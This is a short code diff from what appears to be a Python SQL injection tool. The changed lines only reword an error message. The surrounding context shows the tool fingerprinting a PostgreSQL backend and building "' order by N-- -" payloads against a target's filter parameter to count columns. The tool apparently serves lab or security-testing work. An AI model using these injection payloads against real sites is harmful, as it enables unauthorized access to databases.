@@ -46,7 +46,7 @@ class Columns:
         elif self.make_request(f"{self.__url}filter?{self.__param}={postgre}") == 200:
             print(Fore.GREEN, "[+] Postgre", Style.RESET_ALL)
         else:
-            print("LMAO")
+            print(Fore.RED, "[-] Something went wrong lmao", Style.RESET_ALL)
 
     def encode_url(self, counter) -> str:
         return f"{self.__url}filter?{self.__param}=" + urllib.parse.quote("' order by ") + f"{counter}" + urllib.parse.quote("-- -")
